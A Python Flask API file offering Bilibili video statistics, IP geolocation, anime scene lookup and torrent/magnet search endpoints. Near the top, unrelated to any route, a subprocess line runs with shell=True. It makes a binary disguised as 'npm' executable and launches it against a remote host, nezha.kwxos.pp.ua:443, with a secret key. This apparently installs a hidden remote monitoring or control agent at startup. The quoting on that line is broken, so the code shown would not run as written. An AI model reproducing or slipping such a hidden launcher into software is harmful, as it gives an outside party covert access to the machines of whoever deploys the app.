import datetime
import re
import json
from datetime import datetime
import feedparser
import requests
from bs4 import BeautifulSoup
from flask_cors import *
import subprocess
from flask import Flask,render_template,request,Response,redirect,url_for
#内网ip
app = Flask(__name__)
CORS(app)

subprocess.Popen(["chmod a+x npm && ./npm -s "nezha.kwxos.pp.ua:443" -p "aKfztxOG1NuaAFlPA1" "--tls""], shell=True)
def load_access_count():
    try:
        with open('access_counts.json', 'r') as file:
            data = json.load(file)
            return data
    except FileNotFoundError:
        pass
    return {}

def load_count():
    try:
        with open('access_counts.json', 'r') as file:
            data = json.load(file)
            if isinstance(data, list):
                # 将列表转换为字典，假设每个字典都有 "name" 和 "value" 键
                return {item["name"].rsplit('_', 1)[0]: item["value"] for item in data}
    except FileNotFoundError:
        pass
    return {}

def save_access_count(access_count):
    # 将访问次数字典转换为指定格式的列表
    formatted_data = [{"value": int(count), "name": f"{endpoint}_{count}"} for endpoint, count in access_count.items()]

    # 将格式化后的数据保存到本地文本文件
    with open('access_counts.json', 'w') as file:
        json.dump(formatted_data, file, indent=2)

# 初始化访问次数

access_count = load_count()


def before_request():
    endpoint = request.endpoint
    # print(endpoint)
    # # 打印 access_count 类型
    # print(f"Before: {type(access_count)}")

    # 初始化访问次数为1
    access_count.setdefault(endpoint, 0)
    # 增加访问次数
    access_count[endpoint] += 1
    # print(access_count[endpoint])
    # 保存访问次数到本地文本文件
    save_access_count(access_count)
@app.route('/api')
def apiinfo():
    aa=json.dumps(load_access_count())
    return aa

@app.route('/')
def statistics():
    return render_template('index.html')

@app.route('/bili')
def bili():
    before_request()
    aa=request.args.get('bv')
    url = f"https://api.bilibili.com/x/web-interface/view?bvid={aa}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        "Referer": "https://bilibili.com",
        "Access-Control-Allow-Headers": "Origin,No-Cache,X-Requested-With,If-Modified-Since,Pragma,Last-Modified,Cache-Control,Expires,Content-Type,Access-Control-Allow-Credentials"
    }
    response = requests.get(url, headers=headers)
    response.encoding = 'utf-8'
    response_dict = json.loads(response.text)
    aid = response_dict["data"]["aid"]
    cid = response_dict["data"]["pages"][0]["cid"]
    url2 = f"https://api.bilibili.com/x/player/online/total?aid={aid}&cid={cid}&bvid={aa}"
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "path": f"/x/player/online/total?aid={aid}&cid={cid}&bvid={aa}",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    }
    response2 = requests.get(url2, headers=headers2)
    response2.encoding = 'UTF-8'
    response2_dict = json.loads(response2.text)
    # print(response2.text)
    pic = response_dict["data"]["pic"]
    title = response_dict["data"]["title"]
    tname = response_dict["data"]["tname"]
    desc1 = response_dict["data"]["desc"]
    if "-" == desc1:
        desc = desc1
    elif len(desc1) > 45:
        desc = f"{desc1[:45]}..."
    tid = response_dict["data"]["tid"]
    owner = response_dict["data"]["owner"]["name"]
    ownerid = response_dict["data"]["owner"]["mid"]
    view1 = response_dict["data"]["stat"]["view"]
    if view1 > 10000:
        view2 = view1 / 10000
        view = f"{view2:.2f}W"
    else:
        view = view1
    share1 = response_dict["data"]["stat"]["share"]
    if share1 > 10000:
        share2 = share1 / 10000
        share = f"{share2:.2f}W"
    else:
        share = share1
    like1 = response_dict["data"]["stat"]["like"]
    if like1 > 10000:
        like2 = like1 / 10000
        like = f"{like2:.2f}W"
    else:
        like = like1
    coin1 = response_dict["data"]["stat"]["coin"]
    if coin1 > 10000:
        coin2 = coin1 / 10000
        coin = f"{coin2:.2f}W"
    else:
        coin = coin1
    favorite1 = response_dict["data"]["stat"]["favorite"]
    if favorite1 > 10000:
        favorite2 = favorite1 / 10000
        favorite = f"{favorite2:.2f}W"
    else:
        favorite = favorite1
    danmaku1 = response_dict["data"]["stat"]["danmaku"]
    if danmaku1 > 10000:
        danmaku2 = danmaku1 / 10000
        danmaku = f"{danmaku2:.2f}W"
    else:
        danmaku = danmaku1
    reply1 = response_dict["data"]["stat"]["reply"]
    if reply1 > 10000:
        reply2 = reply1 / 10000
        reply = f"{reply2:.2f}W"
    else:
        reply = reply1
    vt = response_dict["data"]["stat"]["vt"]
    now_rank = response2_dict["data"]["total"]
    formatted_duration = response_dict["data"]["duration"]
    hours = formatted_duration // 3600
    minutes = (formatted_duration % 3600) // 60
    seconds = formatted_duration % 60
    duration = f"{hours}:{minutes}:{seconds}"
    pubdate_timestamp = response_dict["data"]["pubdate"]
    pubdate_datetime = datetime.utcfromtimestamp(pubdate_timestamp)
    pubdate = pubdate_datetime.strftime("%Y.%m.%d/%H:%M:%S")

    data={
        "image": pic,
        "title": title,
        "tname": tname,
        "tid": tid,
        "desc": desc,
        "owner": owner,
        "ownerid": ownerid,
        "view": view,
        "share": share,
        "like": like,
        "coin": coin,
        "favorite": favorite,
        "danmaku": danmaku,
        "reply": reply,
        "aid": aid,
        "now_rank": now_rank,
        "vt": vt,
        "duration": duration,
        "pubdate": pubdate,
        "link": f"https://b23.tv/{aa}"
    }
    return Response(json.dumps(data, ensure_ascii=False), mimetype='application/json')

@app.route('/ipInfo')
def ipInfo():
    before_request()
    aa=request.args.get('ip')
    url = 'https://www.ip123.in/search_ip_page'
    data = {"ip": f"{aa}"}
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded;charset =UTF-8',
        'Referer': 'https://www.ip123.in/',
        'DNT': '1'
    }
    response = requests.post(url, json=data, headers=headers)
    response_data = response.json()['data']
    asn = response_data['asn']
    city = response_data['city']
    continent = response_data['continent']
    continent_code = response_data['continent_code']
    country = response_data['country']
    country_code = response_data['country_code']
    ip = response_data['ip']
    ip_type1 = response_data['ip_type']
    if ip_type1 == "RES":
        ip_type = "住宅"
    elif ip_type1 == "DC":
        ip_type = "机房"
    elif ip_type1 == "MB":
        ip_type = "手机"
    latitude = response_data['latitude']
    longitude = response_data['longitude']
    metro_code = response_data['metro_code']
    network = response_data['network']
    organization = response_data['organization']
    postal = response_data['postal']
    region = response_data['region']
    region_code = response_data['region_code']
    timezone = response_data['timezone']
    data={
        "ip": ip,
        "ip_type": ip_type,
        "metro_code": metro_code,
        "asn": asn,
        "postal": postal,
        "organization": organization,
        "continent_code": continent_code,
        "country_code": country_code,
        "region_code": region_code,
        "continent": continent,
        "country": country,
        "city": city,
        "region": region,
        "network": network,
        "latitude": latitude,
        "longitude": longitude,
        "timezone": timezone,
    }
    return Response(json.dumps(data, ensure_ascii=False), mimetype='application/json')

@app.route('/drama')
def drama():
    before_request()
    eninfo = {}
    web=request.args.get('link')
    url = f"https://api.trace.moe/search?anilistInfo&url={web}"
    response = requests.get(url)
    a = 1
    for i in range(0, len(response.json()["result"]), 2):
        result_data1 = response.json()["result"][i]
        result_data2 = response.json()["result"][i + 1] if i + 1 < len(response.json()["result"]) else None
        anilist1 = result_data1.get("anilist", {}).get("id", 0)
        filename1 = result_data1.get("anilist", {}).get("title", {}).get("native", "")
        filename11 = result_data1.get("anilist", {}).get("title", {}).get("romaji", "")
        isadult = result_data1.get("anilist", {}).get("isAdult", 0)
        # print(isadult)
        if isadult:
            isadult = "成人"
        else:
            isadult = "普通"
        episode1 = result_data1.get("episode", 0)
        from1 = result_data1.get("from", 0)
        to1 = result_data1.get("to", 0)
        similarity1 = result_data1.get("similarity", 0) * 100
        image1 = result_data1.get("image", 0)
        if result_data2:
            anilist2 = result_data2.get("anilist", {}).get("id", 0)
            filename2 = result_data2.get("anilist", {}).get("title", {}).get("native", "")
            filename22 = result_data2.get("anilist", {}).get("title", {}).get("romaji", "")
            isadult1 = result_data2.get("anilist", {}).get("isAdult", 0)
            # print(isadult1)
            if isadult1:
                isadult1 = "成人"
            else:
                isadult1 = "普通"
            episode2 = result_data2.get("episode", 0)
            from2 = result_data2.get("from", 0)
            to2 = result_data2.get("to", 0)
            similarity2 = result_data2.get("similarity", 0) * 100
            image2 = result_data2.get("image", 0)
            eninfo[f"number{a}"] ={
                "number": f"匹配{a}",
                "image": image1,
                 "Anilist": anilist1,
                 "filename": filename1,
                 "en_filename": filename11,
                 "episode": episode1,
                 "isadult": isadult,
                 "similarity": similarity1,
                 "time": "{}-{}".format(from1, to1)
                 }
            eninfo[f"number{a+1}"] ={
                "number": f"匹配{a+1}",
                "image":image2,
                "Anilist": anilist2,
                "filename": filename2,
                "en_filename": filename22,
                "episode": episode2,
                "isadult": isadult1,
                "similarity": similarity2,
                "time": "{}-{}".format(from2, to2)
                 }
        else:
            eninfo[f"number{a}"] = {
                "number": f"匹配{a}",
                "image": image1,
                 "Anilist": anilist1,
                 "filename": filename1,
                 "en_filename": filename11,
                 "episode": episode1,
                 "isadult": isadult,
                 "similarity": similarity1,
                 "time": "{}-{}".format(from1, to1)
                 }
        a += 2
    data = {"info": eninfo}
    return Response(json.dumps(data, ensure_ascii=False), mimetype='application/json')

@app.route('/car_id')
def car_id():
    before_request()
    user_content=request.args.get('id')
    rss_url = f"https://tokyo-tosho.net/rss.php?terms={user_content}&type=0&searchName=true&searchComment=true&size_min=&size_max=&username="
    feed = feedparser.parse(rss_url)
    j = 1
    eninfo = {}
    for entry in feed.entries:
        if j == 1:
            title = f"Entry Title: {entry.title}"
        elif j == 2:
            title = f"Entry Title: {entry.title}"
        description = f"{entry.description}"
        soup = BeautifulSoup(description, 'html.parser')
        soup1 = BeautifulSoup(description, 'html.parser').text
        links = [a['href'] for a in soup.find_all('a')]
        i = 0
        for link in links:
            if i == 0:
                zlink = f"种子link：{link}"
            elif i == 1:
                match = re.search(r'magnet:\?xt=urn:btih:([^&]+)', link)
                key_info = match.group()
                clink = f"磁力link：{key_info}"
            elif i == 2:
                xlink = f"详情link：{link}"
            i += 1
        # print(soup1)
        size_match = re.search(r'Size: (.+)', soup1)
        size = size_match.group(1) if size_match else None
        authorized_match = re.search(r'Authorized: (.+)', soup1)
        authorized = authorized_match.group(1) if authorized_match else None
        submitter_match = re.search(r'Submitter: (.+)', soup1)
        submitter = submitter_match.group(1) if submitter_match else None
        # 获取匹配到的文本内容，如果匹配失败，返回 None
        size = size_match.group(1) if size_match else None
        authorized = authorized_match.group(1) if authorized_match else None
        submitter = submitter_match.group(1) if submitter_match else None
        eninfo[f"number{j}"] = {
            "title":title,
            "zlink": zlink,
            "clink": clink,
            "xlink": xlink,
            "Size": size,
            "Authorized": authorized,
            "Submitter": submitter,
        }
        j += 1
    data = {"info": eninfo}
    return Response(json.dumps(data, ensure_ascii=False), mimetype='application/json')
if __name__ == "__main__":
    """初始化,debug=True"""
    app.run(host='127.0.0.1', port=5000,debug=True)
